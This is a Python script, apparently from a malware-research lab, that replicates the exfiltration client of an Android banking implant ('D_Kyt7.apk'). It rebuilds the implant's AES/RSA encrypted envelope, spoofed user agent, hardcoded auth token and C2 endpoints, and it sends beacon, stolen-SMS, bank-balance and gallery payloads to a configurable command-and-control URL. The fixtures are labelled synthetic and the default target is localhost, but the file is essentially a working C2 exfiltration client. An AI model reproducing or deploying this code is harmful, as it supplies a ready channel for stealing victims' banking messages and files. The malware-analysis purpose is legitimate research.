"""
VexR Protocol Replica — Academic Lab
====================================

Faithful re-implementation of the D_Kyt7.apk uplink client, used to prove the
reconstructed C2 backend can decrypt real implant traffic.

Mirrors:
  a/wg1.java   -> AES/CBC/PKCS5 payload + RSA/ECB/PKCS1 key transport
  a/sp0.java   -> envelope "v=3&d=&k=&i=&", headers, /panel.php and /file.php

Payloads below are SYNTHETIC lab fixtures shaped exactly like what the implant
extracts, so the protocol is exercised end-to-end without arming any payload.

Usage:
    python3 replica_client.py                      # run full demo
    python3 replica_client.py --url http://127.0.0.1:8000
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import secrets
import sys
import urllib.parse
import urllib.request
import uuid

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Hardcoded in the sample (decoded from InternalResolver)
AUTH_TOKEN = "VexR_Lab_Academic_Token_2026"
SUDO_PORT = "EeILBT"


# ---------------------------------------------------------------------------
# Crypto — mirrors a/wg1.java
# ---------------------------------------------------------------------------


def load_public_key(path: str):
    der = base64.b64decode(open(path).read().strip())
    return serialization.load_der_public_key(der)


def pkcs5_pad(data: bytes, block: int = 16) -> bytes:
    padlen = block - (len(data) % block)
    return data + bytes([padlen]) * padlen


def build_envelope(payload: dict, public_key) -> dict[str, str]:
    """Exactly what the implant does before POSTing."""
    aes_key = secrets.token_bytes(32)          # AES-256, random per message
    iv = secrets.token_bytes(16)
    plaintext = json.dumps(payload).encode()

    encryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).encryptor()
    encrypted = encryptor.update(pkcs5_pad(plaintext)) + encryptor.finalize()

    enc_key = public_key.encrypt(aes_key, padding.PKCS1v15())

    return {
        "v": "3",
        "d": base64.b64encode(encrypted).decode(),
        "k": base64.b64encode(enc_key).decode(),
        "i": base64.b64encode(iv).decode(),
    }


# ---------------------------------------------------------------------------
# Transport — mirrors a/sp0.java
# ---------------------------------------------------------------------------


def build_user_agent(model: str = "Pixel 7", release: str = "14") -> str:
    return (
        f"Mozilla/5.0 (Linux; Android {release}; {model}) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
    )


def post(base_url: str, endpoint: str, payload: dict, public_key, action: str | None = None) -> dict:
    url = f"{base_url.rstrip('/')}/{endpoint.lstrip('/')}?p={SUDO_PORT}"
    if action:
        url += f"&action={urllib.parse.quote(action)}"

    envelope = build_envelope(payload, public_key)
    body = urllib.parse.urlencode(envelope).encode()

    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("X-Auth-Token", AUTH_TOKEN)
    req.add_header("User-Agent", build_user_agent())
    req.add_header("Content-Type", "application/x-www-form-urlencoded")

    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read().decode())


# ---------------------------------------------------------------------------
# Synthetic fixtures (same shape as real exfil, no real data)
# ---------------------------------------------------------------------------


def beacon_payload(action: str) -> dict:
    return {
        "device_id": str(uuid.uuid4()),
        "model": "Pixel 7 (lab)",
        "android_version": "14",
        "sdk": 34,
        "action": action,
        "ts": int(__import__("time").time()),
        "payload": {
            "note": "synthetic lab fixture — shaped like implant exfil, no real data",
        },
    }


def sms_payload() -> dict:
    """Shaped exactly like extractAllSms output."""
    return {
        "device_id": str(uuid.uuid4()),
        "model": "Pixel 7 (lab)",
        "android_version": "14",
        "action": "allsms",
        "sms": [
            {"address": "+98Bank", "body": "موجودی شما 12,345,678 ریال است", "date": 1730000000000},
            {"address": "BankMellat", "body": "انتقال 500,000 ریال - کارت 6104-xxxx-xxxx-1234", "date": 1730001000000},
        ],
    }


def balance_payload() -> dict:
    return {
        "device_id": str(uuid.uuid4()),
        "model": "Pixel 7 (lab)",
        "android_version": "14",
        "action": "balance",
        "balances": [
            {"bank": "Mellat", "last_balance": 12345678, "card_tail": "1234"},
            {"bank": "Saderat", "last_balance": 500000, "card_tail": "5678"},
        ],
    }


def file_payload() -> dict:
    return {
        "device_id": str(uuid.uuid4()),
        "model": "Pixel 7 (lab)",
        "action": "gallery",
        "filename": "IMG_20261028_lab.jpg",
        "size": 184320,
        "note": "synthetic metadata only — no image bytes transmitted",
    }


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------


def run(base_url: str, pubkey_path: str) -> int:
    public_key = load_public_key(pubkey_path)
    print(f"[*] target      : {base_url}")
    print(f"[*] auth token  : {AUTH_TOKEN}")
    print(f"[*] rsa key     : {pubkey_path}")
    print()

    cases = [
        ("/panel.php", beacon_payload("install"), "install"),
        ("/panel.php", beacon_payload("online_device"), "online_device"),
        ("/panel.php", sms_payload(), "allsms"),
        ("/panel.php", balance_payload(), "balance"),
        ("/file.php", file_payload(), None),
    ]

    ok = 0
    for endpoint, payload, action in cases:
        label = action or "file_upload"
        try:
            resp = post(base_url, endpoint, payload, public_key, action)
            pending = resp.get("pending_commands", [])
            print(f"[+] {endpoint:<12} action={label:<16} -> {resp.get('status')}"
                  + (f"  pending_commands={pending}" if pending else ""))
            ok += 1
        except Exception as exc:  # noqa: BLE001
            print(f"[-] {endpoint:<12} action={label:<16} -> FAILED: {exc}")

    print()
    print(f"[{'✓' if ok == len(cases) else '!'}] {ok}/{len(cases)} requests accepted by C2")
    return 0 if ok == len(cases) else 1


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=os.environ.get("C2_URL", "http://127.0.0.1:8000"))
    ap.add_argument("--pubkey", default=os.environ.get("C2_PUBKEY", "server_public.pem.b64"))
    args = ap.parse_args()
    sys.exit(run(args.url, args.pubkey))
